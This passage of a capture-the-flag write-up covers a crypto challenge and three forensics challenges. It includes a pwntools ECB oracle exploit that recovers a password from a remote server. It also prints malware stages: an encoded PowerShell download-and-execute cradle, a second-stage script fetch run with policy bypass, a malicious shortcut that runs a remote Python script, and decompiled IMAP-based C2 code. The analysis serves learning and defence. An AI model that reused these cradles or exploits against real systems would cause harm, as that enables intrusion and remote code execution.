+<p>There&rsquo;s one more thing we need to keep in mind for the actual task. In the example above, we had a password that was shorter than the block size, which is not the case for the actual task. Luckily, this is not that big of a change, we just need to expand our <code>2nd</code> &amp; <code>4th</code> blocks to be longer than the password itself (so, in the actual task, the <code>2nd</code> is shifted to be the <code>3rd</code> one, and an extra padding block is added before it; the same thing should happen with the <code>4th</code> block).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PWD_LENGTH <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_value</span>(conn, type, value):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">11</span>):                             <span style="color:#75715e"># skip the menu</span>
+</span></span><span style="display:flex;"><span>        conn<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>type<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())                 <span style="color:#75715e"># send menu selection</span>
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>recvline()
+</span></span><span style="display:flex;"><span>    conn<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>value<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())                <span style="color:#75715e"># send value</span>
+</span></span><span style="display:flex;"><span>    l <span style="color:#f92672">=</span> conn<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>)<span style="color:#f92672">.</span>strip()     <span style="color:#75715e"># receive response</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> l<span style="color:#f92672">.</span>split()[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recover_password</span>(conn):
+</span></span><span style="display:flex;"><span>    recovered <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> len(recovered) <span style="color:#f92672">&lt;</span> PWD_LENGTH:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits:
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>                                             <span style="color:#75715e"># known cipher block</span>
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> len(recovered) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> recovered <span style="color:#f92672">+</span> c     <span style="color:#75715e"># 0-padding + recovered password + searched char (2 blocks)</span>
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span>                                            <span style="color:#75715e"># same as first block</span>
+</span></span><span style="display:flex;"><span>            username <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;0&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">32</span> <span style="color:#f92672">-</span> len(recovered) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)                     <span style="color:#75715e"># same beginning as block 2-3, password will be appended, adding the first `n` chars to the block end</span>
+</span></span><span style="display:flex;"><span>            enc <span style="color:#f92672">=</span> send_value(conn, <span style="color:#ae81ff">1</span>, username)
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> enc[<span style="color:#ae81ff">32</span>:<span style="color:#ae81ff">96</span>] <span style="color:#f92672">==</span> enc[<span style="color:#ae81ff">128</span>:<span style="color:#ae81ff">192</span>]:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>len(recovered) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>PWD_LENGTH<span style="color:#e6db74">}</span><span style="color:#e6db74">: </span><span style="color:#e6db74">{</span>c<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>                recovered <span style="color:#f92672">+=</span> c
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recovered
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;83.136.254.234&#39;</span>, <span style="color:#ae81ff">56453</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>password <span style="color:#f92672">=</span> recover_password(conn)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Recovered password: </span><span style="color:#e6db74">{</span>password<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(send_value(conn, <span style="color:#ae81ff">2</span>, password))
+</span></span></code></pre></div><h1 id="forensics">Forensics<a hidden class="anchor" aria-hidden="true" href="#forensics">#</a></h1>
+<h2 id="thorins-amulet">Thorin&rsquo;s Amulet<a hidden class="anchor" aria-hidden="true" href="#thorins-amulet">#</a></h2>
+<h3 id="stage-1">Stage 1<a hidden class="anchor" aria-hidden="true" href="#stage-1">#</a></h3>
+<p>At the beginning of this task, we are presented with a <code>PowerShell</code> script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> qt4PO {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($env:COMPUTERNAME <span style="color:#f92672">-ne</span> <span style="color:#e6db74">&#34;WORKSTATION-DM-0043&#34;</span>) {
+</span></span><span style="display:flex;"><span>        exit
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    powershell.exe -NoProfile -NonInteractive -EncodedCommand <span style="color:#e6db74">&#34;SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik=&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>qt4PO
+</span></span></code></pre></div><p>The script defines a method and calls it. The method itself spawns a new <code>powershell.exe</code> process to execute an encrypted command. The used encryption is only <code>Base64</code>, so we can easily decrypt it to get the following code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>IEX (New-Object Net.WebClient).DownloadString(<span style="color:#e6db74">&#34;http://korp.htb/update&#34;</span>)
+</span></span></code></pre></div><p>This command downloads some code from <code>http://korp.htb/update</code>, and executes it, using <code>IEX</code></p>
+<h3 id="stage-2">Stage 2<a hidden class="anchor" aria-hidden="true" href="#stage-2">#</a></h3>
+<p>If we visit the <code>URL</code> above, we will find the following script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> aqFVaq {
+</span></span><span style="display:flex;"><span>    Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://korp.htb/a541a&#34;</span> -Headers @{<span style="color:#e6db74">&#34;X-ST4G3R-KEY&#34;</span>=<span style="color:#e6db74">&#34;5337d322906ff18afedc1edc191d325d&#34;</span>} -Method GET -OutFile a541a.ps1
+</span></span><span style="display:flex;"><span>    powershell.exe -exec Bypass <span style="color:#f92672">-File</span> <span style="color:#e6db74">&#34;a541a.ps1&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>aqFVaq
+</span></span></code></pre></div><p>Once again, it downloads a <code>.ps1</code> file and executes it. This time we need to make sure to include the header to get the correct script.</p>
+<h3 id="stage-3">Stage 3<a hidden class="anchor" aria-hidden="true" href="#stage-3">#</a></h3>
+<p>The last script is completely harmless, we can simply run it to get the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$a35 = <span style="color:#e6db74">&#34;4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d&#34;</span>
+</span></span><span style="display:flex;"><span>($a35-split<span style="color:#e6db74">&#34;(..)&#34;</span>|?{$_}|%{[<span style="color:#66d9ef">char][convert</span>]::ToInt16($_,<span style="color:#ae81ff">16</span>)}) -join <span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><h2 id="a-new-hire">A New Hire<a hidden class="anchor" aria-hidden="true" href="#a-new-hire">#</a></h2>
+<h3 id="stage-1-1">Stage 1<a hidden class="anchor" aria-hidden="true" href="#stage-1-1">#</a></h3>
+<p>At the beginning, we get access to a <code>.eml</code> (<code>Electronic Mail</code>) file. It contains a link to a &ldquo;resume&rdquo;. Opening the link redirects us to a new page, where we can download a file called <code>Resume.pdf .lnk</code>.</p>
+<h3 id="stage-2-1">Stage 2<a hidden class="anchor" aria-hidden="true" href="#stage-2-1">#</a></h3>
+<p>If we check the content of this <code>shortcut file</code>, we will see, that it&rsquo;s starting <code>PowerShell</code> with a <code>Base64</code> encrypted command. Once we decrypt it, we get the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>[<span style="color:#66d9ef">System.Diagnostics.Process</span>]::Start(<span style="color:#e6db74">&#39;msedge&#39;</span>, <span style="color:#e6db74">&#39;http://storage.microsoftcloudservices.com:37974/3fe1690d955e8fd2a0b282501570e1f4/resumesS/resume_official.pdf&#39;</span>);\\storage.microsoftcloudservices.com@37974\3fe1690d955e8fd2a0b282501570e1f4\python312\python.exe \\storage.microsoftcloudservices.com@37974\3fe1690d955e8fd2a0b282501570e1f4\configs\client.py
+</span></span></code></pre></div><p>This command does 2 things:</p>
+<ol>
+<li>opens <code>resume_official.pdf</code> in Microsoft Edge; not important for use right now</li>
+<li>runs a remote <code>python</code> script called <code>client.py</code></li>
+</ol>
+<h3 id="stage-3-1">Stage 3<a hidden class="anchor" aria-hidden="true" href="#stage-3-1">#</a></h3>
+<p><code>client.py</code> contains an encrypted payload and an encryption key. Since the key is only encrypted with <code>Base64</code>, we can decrypt it, and we will be presented with the flag.</p>
+<h2 id="silent-trap">Silent Trap<a hidden class="anchor" aria-hidden="true" href="#silent-trap">#</a></h2>
+<p>For this task, we get access to a capture file, that we need to analyse to answer multiple questions.</p>
+<h3 id="flag-1">Flag 1<a hidden class="anchor" aria-hidden="true" href="#flag-1">#</a></h3>
+<p>We need to figure out the subject of the first email the victim opened. We can do it by following these steps:</p>
+<ol>
+<li>open the capture file in <code>wireshark</code></li>
+<li>filter for <code>HTTP</code> communicaiton</li>
+<li>find the first packet that looks like an mailbox, and has the <code>_get</code> action</li>
+<li><code>Right Click</code> -&gt; <code>Follow</code> -&gt; <code>TCP Stream</code></li>
+</ol>
+<p>Once done with the above steps, we will see the source code of the rendered <code>HTML</code> page. All we need now is finding the subject and submitting it as the flag.</p>
+<h3 id="flag-2">Flag 2<a hidden class="anchor" aria-hidden="true" href="#flag-2">#</a></h3>
+<p>For the second flag, we need to figure out the date the malicious email was sent. While looking at the packets, we can find, that the victim has downloaded a zip file. We can assume that it contained the malware, so we need to look for an email that contains a <code>.zip</code> attachment. Once we have it, we can repeat the steps from <code>Flag 1</code> to get the whole <code>HTML</code> page, and get the date.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;header-summary&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">span</span>&gt;From &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;adr&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mailto:proplayer@email.com&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rcmContactAddress&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;return rcmail.command(&#39;compose&#39;,&#39;proplayer@email.com&#39;,this)&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;proplayer@email.com&#34;</span>&gt;proplayer@email.com&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#add&#34;</span> <span style="color:#a6e22e">title</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Add to address book&#34;</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;rcmaddcontact&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;return rcmail.command(&#39;add-contact&#39;,&#39;proplayer@email.com&#39;,this)&#34;</span>&gt;&lt;/<span style="color:#f92672">a</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">span</span>&gt; on &lt;<span style="color:#f92672">span</span> <span style="color:#a6e22e">class</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text-nowrap&#34;</span>&gt;2025-02-24 15:46&lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">span</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">div</span>&gt;
+</span></span></code></pre></div><h3 id="flag-3">Flag 3<a hidden class="anchor" aria-hidden="true" href="#flag-3">#</a></h3>
+<p>Next, we need to figure out the <code>MD5</code> hash of the malware file.</p>
+<p>We can start by donwloading the <code>.zip</code> file ourselves. We can use <code>Wireshark's</code> export functionality (<code>File</code> -&gt; <code>Export Objects</code> -&gt; <code>HTTP</code>). Once we have the file, we need to extract it, but that requires a password. We can check the <code>HTML</code> page from the previous flag to get it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>.venv<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/2025/CyberApocalypse/silent_trap<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ 7z x Eldoria_Balance_Issue_Report.zip  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>7-Zip 24.09 <span style="color:#f92672">(</span>x64<span style="color:#f92672">)</span> : Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 1999-2024 Igor Pavlov : 2024-11-29
+</span></span><span style="display:flex;"><span> 64-bit locale<span style="color:#f92672">=</span>C.UTF-8 Threads:8 OPEN_MAX:1024
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Scanning the drive <span style="color:#66d9ef">for</span> archives:
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> file, <span style="color:#ae81ff">7898</span> bytes <span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> KiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Extracting archive: Eldoria_Balance_Issue_Report.zip
+</span></span><span style="display:flex;"><span>--
+</span></span><span style="display:flex;"><span>Path <span style="color:#f92672">=</span> Eldoria_Balance_Issue_Report.zip
+</span></span><span style="display:flex;"><span>Type <span style="color:#f92672">=</span> zip
+</span></span><span style="display:flex;"><span>Physical Size <span style="color:#f92672">=</span> <span style="color:#ae81ff">7898</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Enter password <span style="color:#f92672">(</span>will not be echoed<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>Everything is Ok
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Size:       <span style="color:#ae81ff">18944</span>
+</span></span><span style="display:flex;"><span>Compressed: <span style="color:#ae81ff">7898</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>.venv<span style="color:#f92672">)</span>─<span style="color:#f92672">(</span>pshegger㉿suki<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/…/ctf/2025/CyberApocalypse/silent_trap<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ md5sum Eldoria_Balance_Issue_Report.pdf.exe 
+</span></span><span style="display:flex;"><span>c0b37994963cc0aadd6e78a256c51547  Eldoria_Balance_Issue_Report.pdf.exe
+</span></span></code></pre></div><h3 id="flag-4">Flag 4<a hidden class="anchor" aria-hidden="true" href="#flag-4">#</a></h3>
+<p>The next task is finding the credentials the malware uses for authentication to an <code>IMAP</code> server.</p>
+<p>If we inspect the binary, we can find, that it&rsquo;s a <code>.NET</code> executable, so we can use a decompiler to see the source code. There are multiple options for that, for example: <a href="https://github.com/icsharpcode/AvaloniaILSpy">AvaloniaILSpy</a>. Once the program is decompiled, we can quickly find a variable named <code>creds</code>, that contains the credentials.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> Program()
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">string</span>[] obj = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>[<span style="color:#ae81ff">5</span>]
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			Environment.MachineName,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;_&#34;</span>,
+</span></span><span style="display:flex;"><span>			Environment.UserName,
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;_&#34;</span>,
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>		};
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">int</span> num = <span style="color:#ae81ff">4</span>;
+</span></span><span style="display:flex;"><span>		obj[num] = Environment.OSVersion?.ToString();
+</span></span><span style="display:flex;"><span>		comp_id = Base64Encode(<span style="color:#66d9ef">string</span>.Concat(obj));
+</span></span><span style="display:flex;"><span>		creds = <span style="color:#e6db74">&#34;proplayer@email.com:completed:mail.korptech.net:0000000000000000000000000000000000000000000000000000000&#34;</span>;
+</span></span><span style="display:flex;"><span>		r_creds = <span style="color:#e6db74">&#34;proplayer1@email.com:completed:mail.korptech.net:000000000000000000000000000000000000000000000000000000000&#34;</span>;
+</span></span><span style="display:flex;"><span>		ssl = <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>		tcp = <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p>If we look further, we can also find a call to the <code>Login</code> method, that shows us how to parse this variable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>Login(creds.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;:&#39;</span> })[<span style="color:#ae81ff">0</span>], creds.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;:&#39;</span> })[<span style="color:#ae81ff">1</span>]);
+</span></span></code></pre></div><h3 id="flag-5">Flag 5<a hidden class="anchor" aria-hidden="true" href="#flag-5">#</a></h3>
+<p>The next flag is the name of a scheduled task. To find it we need to dig deepet into the source code.</p>
+<p>Starting from the <code>Main</code> method, we can find, that a function called <code>readFile</code> is called periodically, and the returned value is then executed as a system command. This means that this is how the malware receives commands from the <code>C2 server</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">string</span>[] readFile()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	connect(creds.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;:&#39;</span> })[<span style="color:#ae81ff">2</span>], <span style="color:#ae81ff">143</span>);
+</span></span><span style="display:flex;"><span>	Login(creds.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;:&#39;</span> })[<span style="color:#ae81ff">0</span>], creds.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;:&#39;</span> })[<span style="color:#ae81ff">1</span>]);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		selectFolder(<span style="color:#e6db74">&#34;Drafts&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">catch</span>
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		selectFolder(<span style="color:#e6db74">&#34;INBOX.Drafts&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span>[] array = searchMessages(comp_id);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (array.Length == <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span> message_number = array[^<span style="color:#ae81ff">1</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span> text = <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i = <span style="color:#ae81ff">0</span>; i &lt; array.Length; i++)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">byte</span>[] bytes = xor(Convert.FromBase64String(getMessage(message_number)));
+</span></span><span style="display:flex;"><span>		text = Encoding.UTF8.GetString(bytes);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span>[] array2 = <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">string</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">string</span>[] array3 = text.Split(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;\n&#39;</span> });
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">foreach</span> (<span style="color:#66d9ef">string</span> text2 <span style="color:#66d9ef">in</span> array3)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (!text2.Contains(<span style="color:#e6db74">&#34; OK&#34;</span>) &amp;&amp; text2.Length &gt; <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			Array.Resize(<span style="color:#66d9ef">ref</span> array2, array2.Length + <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>			array2[^<span style="color:#ae81ff">1</span>] = text2.Trim(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;\r&#39;</span> }).Trim(<span style="color:#66d9ef">new</span> <span style="color:#66d9ef">char</span>[<span style="color:#ae81ff">1</span>] { <span style="color:#e6db74">&#39;)&#39;</span> });
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> array2;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The code above does the following:</p>
+<ol>
+<li>search for specific messages in the <code>Drafts</code> folder</li>
+<li>downoad the message body</li>
+<li>decode it with a custom <code>xor</code> method and convert it to <code>UTF-8</code></li>
+</ol>
+<p>To get the received commands, we need to go back to <code>Wireshark</code>. We can start by filtering for communications that happened over port <code>143</code> (<code>tcp.port == 143</code>). Once we found a message that looks like one of the command, we can figure out a stricter filter to only see those messages (<code>tcp.port == 143 and _ws.col.protocol == &quot;IMAP/IMF&quot;</code>). Once we have all the commands, we still need to decode them. Looking at the <code>xor</code> implementation in the decompiled malware, we can find both the used method and key.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pwd <span style="color:#f92672">=</span> [<span style="color:#ae81ff">168</span>, <span style="color:#ae81ff">115</span>, <span style="color:#f92672">...</span>, <span style="color:#ae81ff">58</span>, <span style="color:#ae81ff">159</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(data):
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>standard_b64decode(data)
+</span></span><span style="display:flex;"><span>    array <span style="color:#f92672">=</span> [pwd[i <span style="color:#f92672">%</span> len(pwd)] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>)]
+</span></span><span style="display:flex;"><span>    array2 <span style="color:#f92672">=</span> list(range(<span style="color:#ae81ff">256</span>))
+</span></span><span style="display:flex;"><span>    array3 <span style="color:#f92672">=</span> bytearray(len(data))
+</span></span><span style="display:flex;"><span>    num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">256</span>):
+</span></span><span style="display:flex;"><span>        num <span style="color:#f92672">=</span> (num <span style="color:#f92672">+</span> array2[i] <span style="color:#f92672">+</span> array[i]) <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>        array2[i], array2[num] <span style="color:#f92672">=</span> array2[num], array2[i]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    num3 <span style="color:#f92672">=</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(data)):
